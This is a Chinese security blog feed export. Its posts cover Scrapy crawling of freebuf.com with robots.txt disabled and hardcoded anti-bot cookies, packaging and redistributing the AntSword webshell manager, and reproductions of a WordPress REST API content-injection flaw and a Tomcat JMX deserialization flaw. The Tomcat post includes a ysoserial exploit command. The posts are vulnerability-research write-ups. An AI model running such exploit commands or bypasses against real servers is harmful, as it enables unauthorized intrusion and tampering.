    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>继续学习scrapy,这次学习如何进行数据爬取。<br><img src="https://i.loli.net/2018/08/28/5b84f81f600a4.png" alt="scrapy -o result.json.png"></p><a id="more"></a><p>在大致了解了scrapy的基础使用方式，接下来开始使用scrapy结合xpath爬取所需的信息。</p><h1 id="freebuf资讯爬取"><a href="#freebuf资讯爬取" class="headerlink" title="freebuf资讯爬取"></a>freebuf资讯爬取</h1><p>假定需要爬取的是freebuf最新的资讯，通过Chrome的Elements可以看到资讯的信息在<code>class=news_inner news-list</code>的div中。<br><a href="https://i.loli.net/2018/08/28/5b84f1db7b7de.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/28/5b84f1db7b7de.png" alt="freebuf div.png"></a><br>使用scrapy shell命令进行调试。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">scrapy <span class="keyword">shell</span><span class="bash"> -s USER_AGENT=<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span> <span class="string">'http://www.freebuf.com</span></span></span><br></pre></td></tr></table></figure><p><a href="https://i.loli.net/2018/08/28/5b84f2795f37e.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/28/5b84f2795f37e.png" alt="scrapy shell debug.png"></a><br>使用<a href="https://www.w3.org/TR/xpath/all/" target="_blank" rel="noopener">xpath</a>选择器来筛选需要的数据。<br><a href="https://i.loli.net/2018/08/28/5b84f42788808.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/28/5b84f42788808.png" alt="scrapy shell get.png"></a><br>最后使用<code>scrapy crawl freebufSprider -o result.json</code>可将结果保存至result.json中。<br><a href="https://i.loli.net/2018/08/28/5b84f81f600a4.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/28/5b84f81f600a4.png" alt="scrapy -o result.json.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>爬虫的步骤：访问站点、解析数据、获取数据。</li><li>scrapy支出css、xpath，大家看哪个顺手就用那个好了。</li></ol><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>完整代码已经上传到GitHub。如果有兴趣，不妨移步到Github上一观！<strong><a href="https://github.com/HyWell/Python/tree/master/Crawler/freebuf" target="_blank" rel="noopener"><font color="blue">Code</font></a></strong>。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Python基础</category>
      </categories>
      <tags>
        <tag>Python2</tag>
        <tag>scrapy</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>Python2-Scrapy学习(一)</title>
    <url>/archives/84973573.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>以前写爬虫都是自己使用requests、bs4等库手工编写，最近想学学scrapy看看这个爬虫神器有多强大。<br><a href="https://i.loli.net/2018/08/24/5b7fc660b4c28.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/24/5b7fc660b4c28.png" alt="scrapy crawl.png"></a></p><a id="more"></a><h1 id="Install-scrapy"><a href="#Install-scrapy" class="headerlink" title="Install scrapy"></a>Install scrapy</h1><p>使用pip安装scrapy即可。<br>sudo pip install scrapy<br><a href="https://i.loli.net/2018/08/24/5b7fc095d3423.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/24/5b7fc095d3423.png" alt="scrapy version.png"></a><br>scrapy的命令常用的有：startproject、shell、crawl等。</p><h1 id="Scrapy-runspider"><a href="#Scrapy-runspider" class="headerlink" title="Scrapy runspider"></a>Scrapy runspider</h1><p>使用scrapy runspider直接运行爬虫脚本。相对项目而言方便快捷。这里我直接使用官方文档的示例。<br>import scrapy</p><pre><code>class QuotesSpider(scrapy.Spider):
    name = &quot;quotes&quot;
    start_urls = [
        &apos;http://quotes.toscrape.com/tag/humor/&apos;,
    ]

    def parse(self, response):
        for quote in response.css(&apos;div.quote&apos;):
            yield {
                &apos;text&apos;: quote.css(&apos;span.text::text&apos;).extract_first(),
                &apos;author&apos;: quote.xpath(&apos;span/small/text()&apos;).extract_first(),
            }

        next_page = response.css(&apos;li.next a::attr(&quot;href&quot;)&apos;).extract_first()
        if next_page is not None:
            yield response.follow(next_page, self.parse)</code></pre><p><a href="https://i.loli.net/2018/08/27/5b83a006498b1.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/27/5b83a006498b1.png" alt="scrapy runsprider.png"></a><br>使用-o参数可以导出结果。<br>scrapy runsprider freebuf.py -o result.json<br><a href="https://i.loli.net/2018/08/27/5b83a042030b7.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/27/5b83a042030b7.png" alt="scrapy runsprider -o.png"></a></p><h1 id="scrapy-startproject"><a href="#scrapy-startproject" class="headerlink" title="scrapy startproject"></a>scrapy startproject</h1><p>使用scrapy startproject创建爬虫项目。</p><h2 id="Config-setting"><a href="#Config-setting" class="headerlink" title="Config setting"></a>Config setting</h2><p>使用scrapy新建爬虫项目，这里我测试站点选择freebuf，建立一个爬虫项目。<br>scrapy startproject freebuf<br>进入freebuf目录，创建基础爬虫。<br>scrapy genspider freebufSprider “freebuf.com”<br>之后目录结构如下图：<br><a href="https://i.loli.net/2018/08/24/5b7fc10d77a9c.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/24/5b7fc10d77a9c.png" alt="scrapy start project tree.png"></a><br>进入freebuf目录下，查看settings.py配置文件。下面列出几个需要修改的配置。<br>ROBOTSTXT_OBEY = False(不遵循Robots.txt规则)<br>USER_AGENT = ‘Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36’(修改User-Agent)<br>DEFAULT_REQUEST_HEADERS = {‘Referer’: ‘<a href="http://www.freebuf.com/&#39;}(设置默认请求头)" target="_blank" rel="noopener">http://www.freebuf.com/&#39;}(设置默认请求头)</a></p><h2 id="scrapy-crawl"><a href="#scrapy-crawl" class="headerlink" title="scrapy crawl"></a>scrapy crawl</h2><p>一开始对freebuf进行爬虫的时候，发现响应包返回不正确。<br><a href="https://i.loli.net/2018/08/25/5b81035d0d421.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/25/5b81035d0d421.png" alt="scrapy no referer.png"></a><br>初步猜测freebuf站点有反爬虫的策略(猜测主要有四点：User-Agent、Cookie、Referer、请求间隔)。为了方便查看请求包，对请求设置HTTP代理。<br>修改settings.py文件中的DOWNOLOAD_MIDDLEAWARES<br>DOWNLOADER_MIDDLEWARES = {<br>‘scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware’: 110,<br>‘freebuf.middlewares.ProxyMiddleware’: 100,<br>}<br>在middlewares.py中增加一个class。<br>class ProxyMiddleware(object):<br># overwrite process request<br>def process_request(self, request, spider):<br># Set the location of the proxy<br>request.meta[‘proxy’] = “<a href="http://127.0.0.1:8080&quot;">http://127.0.0.1:8080&quot;</a><br>如上配置，请求包会通过代理发送到本地8080端口。这里，我使用BurpSuite进行代理拦截。<br><a href="https://i.loli.net/2018/08/25/5b8102c04a263.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/25/5b8102c04a263.png" alt="scrapy proxy.png"></a><br>freebufSprider.py文件进行编写，设置cookie。freebuf的cookie最主要的有两个：acw_sc、acw_tc。<br># -<em>- coding: utf-8 -</em>-<br>import scrapy<br>from scrapy import Request</p><pre><code>class FreebufspriderSpider(scrapy.Spider):
    name = &apos;freebufSprider&apos;
    allowed_domains = [&apos;freebuf.com&apos;]
    start_urls = [&apos;http://www.freebuf.com&apos;]
    cookie = {
        &apos;acw_sc__&apos;: &apos;5b7fb0aee4ffebd067ed819b701014fb3451fcbe&apos;,
        &apos;acw_tc&apos;: &apos;5b7fbdbc6a0b102973a7c8a7b9ecbf0304865342&apos;,
    }

    def start_requests(self):
        yield Request(self.start_urls[0], callback=self.parse, cookies=self.cookie)

    def parse(self, response):
        title = response.css(&apos;title::text&apos;).extract_first()
        self.log(u&apos;编码:%s&apos; % response.encoding)
        self.log(u&apos;标题:%s&apos; % title)</code></pre><p>在项目目录下执行<br>sudo scrapy crawl freebufSprider<br><a href="https://i.loli.net/2018/08/25/5b8103c4adf50.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/25/5b8103c4adf50.png" alt="scrapy success freebuf.png"></a><br><a href="https://i.loli.net/2018/08/24/5b7fc660b4c28.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/24/5b7fc660b4c28.png" alt="scrapy crawl.png"></a></p><h1 id="scrapy-shell"><a href="#scrapy-shell" class="headerlink" title="scrapy shell"></a>scrapy shell</h1><p>也可以使用scrapy的shell进行测试，通过-s USER_AGENT进行请求头设置（不知道为什么使用shell命令，不带cookie也会得到正确的回显）。<br>sudo scrapy shell -s USER_AGENT=’Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36’ ‘<a href="http://www.freebuf.com" target="_blank" rel="noopener">http://www.freebuf.com</a><br><a href="https://i.loli.net/2018/08/24/5b7fc78a09673.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/24/5b7fc78a09673.png" alt="scrapy shell.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>针对不同站点写爬虫的时候，首先需要对站点有所了解：robots.txt、反爬虫机制等。</p><ol><li>Scarpy爬虫项目相对自己编写的爬虫，整体感强，作为一整个项目来进行编写。以前的那种写法，经常一个脚本就要包含一大堆东西，到最后整体很乱，不利于后期代码维护；</li><li>用Scrapy或者Requests&amp;bs4都需要对目标站点需要有所了解；</li><li>单个脚本的scrapy提供了导出等API接口，相对自己些的更方便。</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Python基础</category>
      </categories>
      <tags>
        <tag>Python2</tag>
        <tag>scrapy</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>使用electron-build打包</title>
    <url>/archives/221b42d4.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>在Mac上运行electron框架程序（例如Antsword、CaptfEncoder等）每次都需要<code>npm start</code>，感觉太繁琐了。因此，想打包成app方便使用。成功打包效果图如下，这里给大家提供打包出来的dmg包。<br>Antsword链接:<a href="https://pan.baidu.com/s/1Z4NwAMwcOadof93_1na8mA" target="_blank" rel="noopener">https://pan.baidu.com/s/1Z4NwAMwcOadof93_1na8mA</a> 密码:eokx<br><a href="https://i.loli.net/2018/08/22/5b7d0a4cea9c2.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/22/5b7d0a4cea9c2.png" alt="antsword-success.png"></a><br>CaptfEncoder链接:<a href="https://pan.baidu.com/s/1P4V_OsOIsKu258XbUAE-Zw" target="_blank" rel="noopener">https://pan.baidu.com/s/1P4V_OsOIsKu258XbUAE-Zw</a> 密码:659d<br><a href="https://i.loli.net/2018/11/14/5beb8abf3a945.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/14/5beb8abf3a945.png" alt="CaptfEncoder.png"></a></p><a id="more"></a><p>本文以Antsword为例。</p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>安装<a href="https://brew.sh/" target="_blank" rel="noopener">brew</a></p><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">/usr/<span class="keyword">bin/ruby </span>-e <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"</span></span><br><span class="line"><span class="keyword">brew </span>--version</span><br></pre></td></tr></table></figure><p><a href="https://i.loli.net/2018/08/22/5b7ce3753387f.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/22/5b7ce3753387f.png" alt="brew--version.png"></a><br>安装<a href="https://nodejs.org/en/" target="_blank" rel="noopener">node</a></p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">brew install <span class="keyword">node</span><span class="title"></span></span><br><span class="line"><span class="title">node</span> --<span class="keyword">version</span></span><br><span class="line">npm --<span class="keyword">version</span></span><br></pre></td></tr></table></figure><p><a href="https://i.loli.net/2018/08/22/5b7ce3769f69d.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/22/5b7ce3769f69d.png" alt="node--version.png"></a><br>安装<a href="https://yarnpkg.com/" target="_blank" rel="noopener">yarn</a></p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>yarn</span><br><span class="line">yarn --version</span><br></pre></td></tr></table></figure><p><a href="https://i.loli.net/2018/08/22/5b7ce3c47b5c3.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/22/5b7ce3c47b5c3.png" alt="yarn--version.png"></a><br>安装<a href="https://github.com/electron-userland/electron-builder#in-short" target="_blank" rel="noopener">electron-builder</a>，安装成功之后需要建立软连接</p><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">yarn</span> <span class="keyword">add </span>electron-<span class="keyword">builder </span>-dev</span><br><span class="line"><span class="symbol">sudo</span> find / -name electron-<span class="keyword">builder</span></span><br><span class="line"><span class="keyword">ln </span>-s /Users/hywell/node_modules/.<span class="keyword">bin/electron-builder </span>/usr/local/<span class="keyword">bin/electron-builder</span></span><br><span class="line"><span class="keyword">elecctron-builder </span>--version</span><br></pre></td></tr></table></figure><p><a href="https://i.loli.net/2018/08/22/5b7ce3c47a28f.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/22/5b7ce3c47a28f.png" alt="electron-builder--version.png"></a><br>下载蚁剑，安装依赖并启动</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/AntSwordProject/antSword.git</span><br><span class="line">cd antSword</span><br><span class="line">npm install</span><br><span class="line">npm <span class="literal">start</span></span><br></pre></td></tr></table></figure><p><a href="https://i.loli.net/2018/08/22/5b7ce408c330a.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/22/5b7ce408c330a.png" alt="antSword.png"></a></p><h1 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h1><p>修改antSword目录下的package.json，结构如下：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"antsword"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.3.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">"中国蚁剑是一款跨平台的开源网站管理工具"</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"app.js"</span>,</span><br><span class="line">  <span class="attr">"build"</span>: &#123;</span><br><span class="line">    <span class="attr">"appId"</span>: <span class="string">"1.0"</span>,</span><br><span class="line">    <span class="attr">"mac"</span>: &#123; <span class="comment">//添加设置mac下的配置</span></span><br><span class="line">      <span class="attr">"category"</span>: <span class="string">"public.app-category.developer-tools"</span>,</span><br><span class="line">      <span class="attr">"target"</span>: [</span><br><span class="line">        <span class="string">"dmg"</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"start"</span>: <span class="string">"electron app.js"</span>,</span><br><span class="line">    <span class="attr">"build"</span>: <span class="string">"npm start"</span>,</span><br><span class="line">    <span class="attr">"pack"</span>: <span class="string">"electron-builder --dir"</span>,</span><br><span class="line">    <span class="attr">"dist"</span>: <span class="string">"electron-builder"</span> <span class="comment">// 添加用于执行dist命令</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">"antoor &lt;u@uyu.us&gt;"</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"MIT"</span>,</span><br><span class="line">  <span class="attr">"repository"</span>: &#123;</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"git"</span>,</span><br><span class="line">    <span class="attr">"url"</span>: <span class="string">"https://github.com/antoor/antSword"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"debug"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"update"</span>: &#123;</span><br><span class="line">    <span class="attr">"md5"</span>: <span class="string">"184c9217b01513647ccfaad49e795cfe"</span>,</span><br><span class="line">    <span class="attr">"logs"</span>: <span class="string">"移除webpack以及其他不必要的依赖，直接无需编译即可执行ES6代码\n更新美化关于页面\n重构modules/request.js后端数据请求模块\n添加 aspx hex encoder 支持\n修正custom shell 读取自身时数据被截断的 bug\n增加php中的mysql数据库模板，用于不支持使用mysqli的服务器\n以及其他小部分的代码重构优化"</span>,</span><br><span class="line">    <span class="attr">"sources"</span>: &#123;</span><br><span class="line">      <span class="attr">"coding.net"</span>: <span class="string">"https://coding.net/api/share/download/c405db5d-6fdb-4078-9326-32cd86c392a3"</span>,</span><br><span class="line">      <span class="attr">"github"</span>: <span class="string">"https://github.com/antoor/antSword/releases/download/1.3.0/update.zip"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"bugs"</span>: &#123;</span><br><span class="line">    <span class="attr">"url"</span>: <span class="string">"https://github.com/antoor/antSword/issues"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"homepage"</span>: <span class="string">"http://uyu.us"</span>,</span><br><span class="line">  <span class="attr">"postinstall"</span>: <span class="string">"electron-builder install-app-deps"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在antSword目录下新建一个app文件夹，将antSword目录下所有文件迁移到app文件夹下(<font color="red">保证原有结构不变</font>)。结构如下:<br><a href="https://i.loli.net/2018/08/22/5b7d0d736d8a4.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/08/22/5b7d0d736d8a4.png" alt="tree -L 2 -C.png"></a><br>在里面新建一个package.json文件，结构如下:</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"antsword"</span>,</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"1.3.0"</span>,</span><br><span class="line">    <span class="attr">"main"</span>: <span class="string">"app.js"</span>,</span><br><span class="line">    <span class="attr">"description"</span>: <span class="string">"antsword-MacOS"</span>,</span><br><span class="line">    <span class="attr">"author"</span>: <span class="string">"antoor &lt;u@uyu.us&gt;"</span>,</span><br><span class="line">    <span class="attr">"dependencies"</span>: &#123; <span class="comment">// 将上个文件的依赖迁移</span></span><br><span class="line">        <span class="attr">"babel"</span>: <span class="string">"^5.2.17"</span>,</span><br><span class="line">        <span class="attr">"extract-zip"</span>: <span class="string">"^1.5.0"</span>,</span><br><span class="line">        <span class="attr">"geoips"</span>: <span class="string">"0.0.1"</span>,</span><br><span class="line">        <span class="attr">"iconv-lite"</span>: <span class="string">"^0.4.13"</span>,</span><br><span class="line">        <span class="attr">"log4js"</span>: <span class="string">"^0.6.29"</span>,</span><br><span class="line">        <span class="attr">"nedb"</span>: <span class="string">"^1.5.1"</span>,</span><br><span class="line">        <span class="attr">"nugget"</span>: <span class="string">"^2.0.0"</span>,</span><br><span class="line">        <span class="attr">"superagent"</span>: <span class="string">"^3.8.3"</span>,</span><br><span class="line">        <span class="attr">"superagent-proxy"</span>: <span class="string">"^1.0.0"</span>,</span><br><span class="line">        <span class="attr">"through"</span>: <span class="string">"^2.3.8"</span></span><br><span class="line">      &#125;,</span><br><span class="line">    <span class="attr">"devDependencies"</span>: &#123;</span><br><span class="line">        <span class="attr">"electron-prebuilt"</span>: <span class="string">"^0.37.2"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在antSword目录下,执行命令将其打包。</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">yarn dist</span></span><br></pre></td></tr></table></figure><p>完成之后会生成一个dist目录，在目录中就有成功打包的antSword。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次耗费了大半天的时间,查阅了无数资料,发现还是官方的文档最好!</p><ol><li>elecctron-builder打包程序时，需要建立一个app文件夹&amp;两个package.json（一个作为打包使用，一个作为项目使用）;</li><li>elecctron-builder打包程序时，把所有程序的资源文件、代码文件等都放到app文件夹下；</li><li>遇到<code>cannot unpack electron zip file, will be re-downloaded error=zip: not a valid zip file</code>，请删除缓存<code>rm -rf ~/Library/Caches/electron/</code></li><li>编译出来的程序无法正常运行，可通过运行dist(release)/mac/xxxx.app/Contents/MacOS/xxxx，查看错误信息以便定位问题；</li><li>两个package.json的区别，根据我的理解（不一定正确，大家可以看官方文档），最外层的package.json是打包的配置信息，里层的package.json为项目的配置信息。因此依赖（dependencies、devDependencies）写在里面package.json。</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>工具环境</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>MacOS python2 pycurl安装</title>
    <url>/archives/366a0bef.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>MacOS安装pycurl的时候出了一堆问题：SSL、Permitted等，用网上的一堆方法都无法成功安装。最后，通过查看pycurl官网文档、网上资料结合，终于安装成功！<br><img src="https://i.loli.net/2018/08/20/5b7a9015e7522.png" alt="python pycurl.png"></p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一开始使用easy_install、pip两种安装方式都会遇到SSL报错。查询网上资料，指定openssl的环境变量并指定使用openssl安装也无法解决。<br><img src="https://i.loli.net/2018/08/20/5b7a91f09666a.png" alt="pycurl ssl 报错.png"></p><h1 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h1><p>下载<a href="https://dl.bintray.com/pycurl/pycurl/pycurl-7.43.0.2.tar.gz" target="_blank" rel="noopener">pycurl源码</a>，解压到对应目录。<br><code>sudo python setup.py install --with-openssl --openssl-dir=/usr/local/opt/openssl</code><br>其中”openssl-dir”需要根据自身电脑安装路径进行设置。<br><img src="https://i.loli.net/2018/08/20/5b7a93586d03d.png" alt="permitted不够.png"><br>使用上诉命令会出现权限不够的问题，通过添加–user可以解决。<br><code>sudo python setup.py install --with-openssl --openssl-dir=/usr/local/opt/openssl --user</code><br><img src="https://i.loli.net/2018/08/20/5b7a93662dcc8.png" alt="success.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>MacOS安装东西真麻烦！！！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Python基础</category>
      </categories>
      <tags>
        <tag>pycurl</tag>
        <tag>python2</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-5487分析</title>
    <url>/archives/5a5cf5bb.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>针对Content Injection Vulnerability in WordPress进行复现并分析。<br><img src="https://i.loli.net/2018/05/31/5b0f887805634.png" alt="success.png"></p><a id="more"></a><h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>由于WordPress4.7.0-4.7.1REST API接口权限判断不合理导致命令注入。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p><a href="https://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab" target="_blank" rel="noopener">下载</a>POC脚本，运行即可。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>查看/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php的第90行，发现参数ID的值会被过滤成数字。发现REST API在管理访问时，其会在正则表达式之前优先考虑$_GET和$_POST的值。例如: /wp-json/wp/v2/posts/1234?id=12345helloworld，REST API会将其ID参数设置成12345helloworld。<br>在99行使用了update_item和update_item_permissions_check。<br><img src="https://i.loli.net/2018/05/31/5b0f89783224b.png" alt="1.png"><br>查看593行的update_item_permissions_check函数，其将ID值传递给get_post()函数。这个函数功能用来检查帖子是否存在、是否有权限。如果发送的ID没有对应的post，就可以绕过权限检查，并允许继续执行update_item方法。<br><img src="https://i.loli.net/2018/05/31/5b0f899d3b8fa.png" alt="2.png"><br>由于使用get_instance()静态方法来获取post，造成get_post()在特定情况下无法找到对应的ID。<br>查看/wordpress/wp-includes/class-wp-post.php第210行，发现需全部使用数字，例如123ABC将会导致获取post失败。有一个细节，其会将ID参数在传递给get_post之前会将其转换成整数。<br><img src="https://i.loli.net/2018/05/31/5b0f89b300743.png" alt="3.png"><br>PHP语言中做类型的比较和转换时，其会返回整数。例如<br><img src="https://i.loli.net/2018/05/31/5b0f89c229bd3.png" alt="4.png"><br>例如提交一个请求为/wp-json/wp/v2/posts/123?id=456ABC，PHP会将其ID返回456。由于456ABC并不是纯数字会导致/wordpress/wp-includes/class-wp-post.php获取post_id失败。在流程进入权限检查时update_item_permissions_check判断其没有对应的post绕过权限判断，进行更新操作update_item。最终导致ID为456被修改。<br>在受影响的WordPress版本中REST API接口是默认开放的。任何用户都可以利用该漏洞修改任意文章，只需要指定修改文章的ID即可。<br>修改前：<br><img src="https://i.loli.net/2018/05/31/5b0f89dc0e3d0.png" alt="5.png"><br>修改后：<br><img src="https://i.loli.net/2018/05/31/5b0f89edabed6.png" alt="6.png"></p><h2 id="复现注意事项"><a href="#复现注意事项" class="headerlink" title="复现注意事项"></a>复现注意事项</h2><p>在复现时如果遇到id is not of type integer报错信息，有可能是因为版本不对。最新版本的4.7.2已经对该漏洞进行修复。<br><img src="https://i.loli.net/2018/05/31/5b0f8a0db7ddf.png" alt="11.png"><br><img src="https://i.loli.net/2018/05/31/5b0f8a19c8a8a.png" alt="12.png"></p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级WordPress至4.7.2及以上。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2016-8735分析</title>
    <url>/archives/c77f03de.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>针对CVE-2016-8735复现并分析。<br><img src="https://i.loli.net/2018/05/30/5b0e433658076.png" alt="success.png"></p><a id="more"></a><h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Tomcat启动JmxRemoteLifecycleListener监听器，在/conf/server.xml中添加<listener classname="org.apache.catalina.mbeans.JmxRemoteLifecycleListener" rmiregistryportplatform="10001" rmiserverportplatform="10002">Tomcat默认未开启JmxRemoteLifecycleListener监听器。在实际环境中，使用zabbix（是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案）通过JMX监控tomcat即会产生该漏洞环境。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">java</span> <span class="selector-tag">-cp</span> <span class="selector-tag">ysoserial-0</span><span class="selector-class">.0</span><span class="selector-class">.5-SNAPSHOT-all</span><span class="selector-class">.jar</span> <span class="selector-tag">ysoserial</span><span class="selector-class">.exploit</span><span class="selector-class">.RMIRegistryExploit</span> <span class="selector-tag">localhost</span> 10001 <span class="selector-tag">Groovy1</span> <span class="selector-tag">calc</span><span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/05/30/5b0e43a478dc9.png" alt="command.png"></p><h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>根据攻击命令发现攻击函数为RMIRegistryExploit在ysoserial-0.0.5-SNAPSHOT-all.jar包中的ysoserial.exploit中。通过解压缩软件将RMIRegistryExploit从ysoserial-0.0.5-SNAPSHOT-all.jar解压出来。由于解压出来为class，对其进行反编译。<br><img src="https://i.loli.net/2018/05/30/5b0e440d9b0d7.png" alt="1.png"><br>第13行定义了RMIRegistryExploit类，第20行需传递一个数组，21行抛出Exception异常类型。<br><img src="https://i.loli.net/2018/05/30/5b0e442579ebc.png" alt="2.png"><br>第23行-25行定义了host为数组的第一位数值，port（int）为数组的第二位数值（通过Integer.parseInt将整形对象转换成int型），command为数组的第三位数值。<br><img src="https://i.loli.net/2018/05/30/5b0e443c27aed.png" alt="3.png"><br>在26行使用java.rmi.registry.LocateRegistry中的LocateRegistry.getRegistry方法来返回对Registry对象的引用。<img src="https://i.loli.net/2018/05/30/5b0e444fa93f7.png" alt="4.png"><br>在27行定义一个string 名字为className，通过StringBuilder创建一个新实例（结合后面代码中的append可发现用于快速进行字符相加），并获取CommonsCollections1的包的名字，最后把待执行的命令加上包的名字整体作为string赋值给className。28行获得该类(className)并初始化该类。<br><img src="https://i.loli.net/2018/05/30/5b0e4466de818.png" alt="5.png"><br>第29行执行exploit.warp，传递三个参数；第35行使用ExecCheckingSecurityManager的wrap并传一个对象，该对象包含三个参数（payloadClass、command、registry），跟踪ExecCheckingSecurityManager（ysoserial.secmgr.ExecCheckingSecurityManager）查看warp的作用（用于并发）。<br><img src="https://i.loli.net/2018/05/30/5b0e447fd6e8d.png" 